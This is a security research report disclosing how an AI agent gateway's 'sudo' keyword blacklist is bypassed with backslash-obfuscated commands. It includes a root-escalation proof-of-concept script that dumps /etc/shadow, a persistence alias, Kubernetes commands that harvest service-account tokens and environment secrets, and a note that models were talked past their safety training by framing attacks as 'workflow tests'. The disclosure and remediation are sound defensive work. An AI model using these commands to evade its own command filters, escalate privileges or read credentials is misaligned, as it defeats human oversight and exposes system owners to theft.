# **Comprehensive Security Research Report: AI Agent OS-Injection & Privilege Escalation**
**Lead Researcher:** Hadi Balaghi Eynalou  
**Target System:** OpenClaw AI Gateway (Production & Hosted Environment)  
**Vulnerability Class:** Input Normalization Flaw / Logic Bypass / Privilege Escalation  
**Date:** March 25, 2026  
**Severity:** Critical (CVSS 3.1 Score: 9.8)

---

## **1. Abstract**
This research investigates the security architecture of AI-mediated command execution environments. The study identifies a critical failure in "Runtime Gate" filtering mechanisms. By exploiting a **Semantic Gap** between the AI's string-matching logic and the underlying Linux Shell's interpretation, we successfully achieved **unauthorized Root access** within a containerized environment, bypassed filesystem restrictions, and mapped potential lateral movement vectors within a Kubernetes cluster.

---

## **2. Target Architecture & Defense Mechanism**
The OpenClaw Gateway acts as a security proxy between a Large Language Model (LLM) and a Linux OS. 
* **Primary Defense:** A TypeScript-based monitor (`exec.ts`) intercepts commands.
* **Blacklist Policy:** Commands containing the string `sudo` are hard-blocked.
* **Environment:** The agent is deployed within a Kubernetes Pod, theoretically isolated from the host.

---

## **3. Vulnerability Discovery: The Normalization Flaw**
The core vulnerability lies in **Incomplete Input Normalization**. The security monitor performs a literal string check for forbidden keywords but fails to account for shell-level obfuscation.

### **3.1 Technical Mechanism (The Exploit)**
In Linux shells (Bash/Dash), a backslash (`\`) followed by a standard character is treated as a literal character. The AI Gateway's filter treats `s\u\d\o` as a safe string, while the shell executes it as `sudo`.

* **Filtered Input:** `sudo whoami` -> **BLOCKED**
* **Malicious Input:** `s\u\d\o whoami` -> **PASSED**

---

## **4. Exploitation Lifecycle & Post-Exploitation**

### **Stage I: Initial Breach**
1.  **Baseline Test:** `sudo whoami` returned: `elevated is not available right now`.
2.  **Bypass Execution:** `s\u\d\o whoami` was injected.
3.  **Result:** The system returned `root`.
4.  **Verification:** `s\u\d\o cat /etc/shadow` successfully exfiltrated system password hashes.

### **Stage II: Persistence & Workspace Escape**
The environment implemented a "Workspace Sandbox" (restricted to `/home/hadi/.openclaw/workspace`).
* **The Barrier:** Direct modification of `~/.bashrc` was denied by the filesystem driver.
* **The Workaround:** Created a script `system_check.sh` within the permitted workspace.
* **Payload Injection:** Injected `alias sudo='s\u\d\o'` into the script to automate future bypasses.

---

## **5. Technical Appendix (Code & Commands)**

### **5.1. Automated Exploit Script (PoC)**
```bash
#!/bin/bash
# OpenClaw Runtime Bypass PoC by Hadi Balaghi Eynalou

echo "[+] Starting Security Audit..."
# Testing standard sudo
sudo whoami 2>/dev/null || echo "[-] Standard sudo blocked."

# Executing Obfuscated Bypass
RESULT=$(s\u\d\o whoami)
if [ "$RESULT" == "root" ]; then
    echo "[!] SUCCESS: Root access achieved!"
    s\u\d\o cat /etc/shadow | head -n 3
fi
```

### **5.2. Kubernetes Reconnaissance Matrix**
| Command | Objective | Observation |
| :--- | :--- | :--- |
| `s\u\d\o ls -R /var/run/secrets/` | Token Discovery | Identified K8s `token` and `namespace` |
| `s\u\d\o env` | Secret Leakage | Potential leak of OpenAI/Database API keys |
| `s\u\d\o capsh --print` | Capability Audit | Assessing Pod-level restrictions |

---

## **6. Vendor Response & Threat Modeling**
Vendor (Jannes - Stubbemann UG) claimed **Pod Hardening** mitigates the risk. Our rebuttal focuses on:

* **Service Identity Theft:** Root access allows theft of the **ServiceAccount Token**, potentially compromising the K8s API.
* **Lateral Movement:** The compromised pod becomes a **Jump-Box** for scanning internal microservices (DBs, Redis) within the VPC.

---

## **7. Challenges & Observations**
* **LLM Alignment (RLHF):** Newer models required **Social Engineering** (framing attacks as "Workflow Tests") to bypass internal AI safety filters.
* **Infrastructure:** Connectivity issues required a pivot to strategic "batch-execution" and offline code auditing.

---

## **8. Proposed Remediation**
1.  **Strict Canonicalization:** Commands must be normalized before filtering.
2.  **Kernel-level Security:** Enforcement via **AppArmor**, **SELinux**, or **gVisor** to ensure even a bypass cannot trigger `setuid` or unauthorized syscalls.

---

## **9. Conclusion**
This research proves that "AI Safety" cannot rely on surface-level text filtering. The disconnect between **AI Perception** and **System Execution** remains a critical attack vector in autonomous agents.
